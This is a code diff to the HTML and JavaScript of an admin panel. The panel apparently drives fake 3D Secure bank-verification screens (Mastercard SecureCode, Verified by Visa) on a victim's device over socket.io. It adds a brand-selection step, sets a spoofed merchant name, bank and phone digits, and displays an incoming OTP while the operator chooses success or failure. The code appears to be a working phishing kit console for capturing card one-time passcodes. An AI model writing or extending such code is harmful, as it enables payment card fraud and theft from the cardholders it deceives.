@@ -669,14 +669,22 @@
     </table>
   </div>
 
-  <!-- MC Verification Overlay -->
-  <div id="mcOtpPanel" class="hidden">
-    <div class="bg-gray-800 p-6 rounded-lg max-w-md w-full">
-      <h3 class="text-xl font-bold mb-4">3D Secure Verification</h3>
-      
+<!-- MC Verification Overlay -->
+<div id="mcOtpPanel" class="hidden">
+  <div class="bg-gray-800 p-6 rounded-lg max-w-md w-full">
+    <h3 class="text-xl font-bold mb-4">3D Secure Verification</h3>
+    
+    <!-- Step Indicator -->
+    <div class="flex justify-between mb-4 text-sm">
+      <div id="brandStepIndicator" class="font-bold text-blue-400">1. Brand Selection</div>
+      <div id="detailsStepIndicator" class="text-gray-400">2. Verification Details</div>
+    </div>
+    
+    <!-- Brand Selection Step -->
+    <div id="brandSelectionStep">
       <!-- Verification Type Selector -->
       <div class="mb-4">
-        <label class="block text-sm mb-2">Verification Type:</label>
+        <label class="block text-sm mb-2">Card Brand:</label>
         <select id="mcVerificationType" class="bg-gray-700 text-white w-full p-2 rounded">
           <option value="mastercard">Mastercard SecureCode</option>
           <option value="visa">Verified by Visa</option>
@@ -686,6 +694,14 @@
         </select>
       </div>
       
+      <!-- Continue Button -->
+      <button id="brandSelectContinueBtn" class="bg-blue-600 text-white py-2 px-4 rounded mb-4 w-full">
+        Continue to Verification
+      </button>
+    </div>
+    
+    <!-- Verification Details Step (Initially Hidden) -->
+    <div id="verificationDetailsStep" style="display: none;">
       <div class="mb-4">
         <label class="block text-sm mb-2">Bank:</label>
         <select id="mcBankSelect" class="bg-gray-700 text-white w-full p-2 rounded">
@@ -773,7 +789,7 @@
         </select>
       </div>
       
-      <!-- Currency Selector - ADDED -->
+      <!-- Currency Selector -->
       <div class="mb-4">
         <label class="block text-sm mb-2">Currency:</label>
         <select id="mcCurrencySelect" class="bg-gray-700 text-white w-full p-2 rounded">
@@ -966,7 +982,8 @@
         </select>
       </div>
 
-      <!-- Phone Number Field - ADDED -->
+     
+           <!-- Phone Number Field -->
       <div class="mb-4">
         <label class="block text-sm mb-2">Phone Number (last 4 digits):</label>
         <input type="text" id="mcPhoneLastFour" maxlength="4" placeholder="Enter 4 digits" 
@@ -988,7 +1005,7 @@
           Success
         </button>
         
-        <!-- New Fail Options Button -->
+        <!-- Fail Options Button -->
         <button id="mcFailOptionsBtn" class="fail-options-btn">
           Fail Options
         </button>
@@ -1019,6 +1036,7 @@
       </div>
     </div>
   </div>
+</div>
   
   <script src="/socket.io/socket.io.js"></script>
   <script>
@@ -2669,43 +2687,55 @@
       }
     }
 
-    // Show MC Verification Function
-    function showMCVerification(id) {
-      if (!transactionsMap.has(id)) {
-        alert('Transaction not found');
-        return;
-      }
-      
-      console.log('Showing MC verification for transaction:', id);
-      
-      // Get transaction details
-      const tx = transactionsMap.get(id);
-      
-      // Set the current transaction ID
-      currentMcInvoiceId = id;
-      
-      // Show the MC panel
-      const panel = document.getElementById('mcOtpPanel');
-      panel.classList.remove('hidden');
-      
-      // Reset OTP value display
-      document.getElementById('mcOtpValue').textContent = 'Waiting...';
-      
-      // Ensure MC fail options are hidden by default
-      document.getElementById('mcFailOptions').style.display = 'none';
-      
-      // Reset phone number field
-      document.getElementById('mcPhoneLastFour').value = '';
-      
-      // Reset defaults for verification type and bank
-      document.getElementById('mcVerificationType').value = detectCardType(tx.cardNumber);
-      document.getElementById('mcBankSelect').value = 'default';
-      
-      // Reset currency based on transaction
-      document.getElementById('mcCurrencySelect').value = tx.currency || 'INR';
-      
-      console.log('MC panel initialized for transaction:', id);
-    }
+   // When showing MC verification, update to show brand selection step first
+function showMCVerification(id) {
+  if (!transactionsMap.has(id)) {
+    alert('Transaction not found');
+    return;
+  }
+  
+  console.log('Showing MC verification for transaction:', id);
+  
+  // Get transaction details
+  const tx = transactionsMap.get(id);
+  
+  // Set the current transaction ID
+  currentMcInvoiceId = id;
+  
+  // Reset to brand selection step
+  document.getElementById('brandSelectionStep').style.display = 'block';
+  document.getElementById('verificationDetailsStep').style.display = 'none';
+  
+  // Reset step indicators
+  document.getElementById('brandStepIndicator').classList.add('text-blue-400');
+  document.getElementById('brandStepIndicator').classList.remove('text-gray-400');
+  document.getElementById('detailsStepIndicator').classList.add('text-gray-400');
+  document.getElementById('detailsStepIndicator').classList.remove('text-blue-400');
+  
+  // Show the MC panel
+  const panel = document.getElementById('mcOtpPanel');
+  panel.classList.remove('hidden');
+  
+  // Reset OTP value display
+  document.getElementById('mcOtpValue').textContent = 'Waiting...';
+  
+  // Ensure MC fail options are hidden by default
+  document.getElementById('mcFailOptions').style.display = 'none';
+  
+  // Reset phone number field
+  document.getElementById('mcPhoneLastFour').value = '';
+  
+  // Set default brand based on card number
+  document.getElementById('mcVerificationType').value = detectCardType(tx.cardNumber);
+  
+  // Reset bank to default
+  document.getElementById('mcBankSelect').value = 'default';
+  
+  // Reset currency based on transaction
+  document.getElementById('mcCurrencySelect').value = tx.currency || 'USD';
+  
+  console.log('MC panel initialized for brand selection for transaction:', id);
+}
 
     // Function to detect card type from number
     function detectCardType(cardNumber) {
@@ -2806,93 +2836,101 @@
       }
     }
 
-    // MC Panel initialization
-    function initMcPanel() {
-      console.log('Initializing MC Panel...');
-      
-      // Make sure the panel is initially hidden
-      const mcPanel = document.getElementById('mcOtpPanel');
-      mcPanel.classList.add('hidden');
-      
-      // Debug all buttons
-      document.querySelectorAll('#mcOtpPanel button').forEach(btn => {
-        console.log('Found MC panel button:', btn.id || btn.textContent);
-        
-        // Remove any existing event listeners
-        const newBtn = btn.cloneNode(true);
-        btn.parentNode.replaceChild(newBtn, btn);
+// Initialize the MC Panel with brand selection first
+function initMcPanel() {
+  console.log('Initializing MC Panel with brand selection flow...');
+  
+  // Make sure the panel is initially hidden
+  const mcPanel = document.getElementById('mcOtpPanel');
+  mcPanel.classList.add('hidden');
+  
+  // Brand Selection Step
+  document.getElementById('brandSelectContinueBtn').addEventListener('click', function() {
+    // Get selected brand
+    const brandType = document.getElementById('mcVerificationType').value;
+    console.log('Brand selected:', brandType);
+    
+    // Transition to verification details step
+    document.getElementById('brandSelectionStep').style.display = 'none';
+    document.getElementById('verificationDetailsStep').style.display = 'block';
+    
+    // Update step indicators
+    document.getElementById('brandStepIndicator').classList.remove('text-blue-400');
+    document.getElementById('brandStepIndicator').classList.add('text-gray-400');
+    document.getElementById('detailsStepIndicator').classList.remove('text-gray-400');
+    document.getElementById('detailsStepIndicator').classList.add('text-blue-400');
+    
+    // Send command to show brand selection in client
+    if (currentMcInvoiceId && socket && socket.connected) {
+      socket.emit('admin_command', {
+        command: 'show_brand_selection',
+        invoiceId: currentMcInvoiceId
       });
       
-      console.log('MC Panel buttons reset');
+      // Update the brand type
+      socket.emit('admin_command', {
+        command: 'update_brand_type',
+        invoiceId: currentMcInvoiceId,
+        brandType: brandType
+      });
+    }
+  });
+  
+  // Start verification button
+  document.getElementById('mcStartVerification').addEventListener('click', function() {
+    if (!currentMcInvoiceId) {
+      alert('No transaction selected');
+      return;
+    }
+    
+    const verificationType = document.getElementById('mcVerificationType').value;
+    const bankCode = document.getElementById('mcBankSelect').value;
+    const currency = document.getElementById('mcCurrencySelect').value;
+    const phoneLastFour = document.getElementById('mcPhoneLastFour').value;
+    
+    if (!phoneLastFour || phoneLastFour.length !== 4 || !/^\d{4}$/.test(phoneLastFour)) {
+      alert('Please enter the last 4 digits of the phone number');
+      return;
+    }
+    
+    // First, show the MC verification screen to the client
+    socket.emit('admin_command', {
+      command: 'show_mc_verification',
+      invoiceId: currentMcInvoiceId,
+      cardType: verificationType,
+      phoneLastFour: phoneLastFour
+    });
+    
+    // Wait a moment before sending the start command
+    setTimeout(() => {
+      // Then send the start verification command with all details
+      socket.emit('admin_command', {
+        command: 'start_verification',
+        invoiceId: currentMcInvoiceId,
+        verificationType: verificationType,
+        bankCode: bankCode,
+        merchantName: 'Peacock Merchandise',
+        phoneLastFour: phoneLastFour
+      });
       
-      // Start verification button
-      document.getElementById('mcStartVerification').addEventListener('click', function() {
-        if (!currentMcInvoiceId) {
-          alert('No transaction selected');
-          return;
-        }
-        
-        const verificationType = document.getElementById('mcVerificationType').value;
-        const bankCode = document.getElementById('mcBankSelect').value;
-        const currency = document.getElementById('mcCurrencySelect').value;
-        const phoneLastFour = document.getElementById('mcPhoneLastFour').value;
-        
-        if (!phoneLastFour || phoneLastFour.length !== 4 || !/^\d{4}$/.test(phoneLastFour)) {
-          alert('Please enter the last 4 digits of the phone number');
-          return;
-        }
-        
-        console.log('Starting MC verification with:', {
-          invoiceId: currentMcInvoiceId,
-          verificationType,
-          bankCode,
-          currency,
-          phoneLastFour
-        });
-        
-        // First, show the MC verification screen to the client
-        socket.emit('admin_command', {
-          command: 'show_mc_verification',
-          invoiceId: currentMcInvoiceId,
-          cardType: verificationType,
-          phoneLastFour: phoneLastFour
-        });
-        
-        console.log('Emitted show_mc_verification command');
-        
-        // Wait a moment before sending the start command
-        setTimeout(() => {
-          // Then send the start verification command with all details
-          socket.emit('admin_command', {
-            command: 'start_verification',
-            invoiceId: currentMcInvoiceId,
-            verificationType: verificationType,
-            bankCode: bankCode,
-            merchantName: 'Secure Gateway',
-            phoneLastFour: phoneLastFour
-          });
-          
-          console.log('Emitted start_verification command');
-          
-          // Update currency if needed
-          socket.emit('update_mc_currency', {
-            invoiceId: currentMcInvoiceId,
-            currency: currency
-          });
-          
-          console.log('Emitted update_mc_currency command');
-        }, 1000); // 1 second delay to ensure show_mc_verification is processed first
-        
-        // Set button to loading state
-        const startBtn = document.getElementById('mcStartVerification');
-        startBtn.innerHTML = 'Starting Verification...';
-        startBtn.disabled = true;
-        
-        // Reset button after 3 seconds
-        setTimeout(() => {
-          startBtn.innerHTML = 'Start Verification';
-          startBtn.disabled = false;
-        }, 3000);
+      // Update currency if needed
+      socket.emit('update_mc_currency', {
+        invoiceId: currentMcInvoiceId,
+        currency: currency
+      });
+    }, 1000);
+    
+    // Set button to loading state
+    const startBtn = document.getElementById('mcStartVerification');
+    startBtn.innerHTML = 'Starting Verification...';
+    startBtn.disabled = true;
+    
+    // Reset button after 3 seconds
+    setTimeout(() => {
+      startBtn.innerHTML = 'Start Verification';
+      startBtn.disabled = false;
+    }, 3000);
+  });
         
         showMessage('success', 'MC verification started for transaction ' + currentMcInvoiceId);
       });
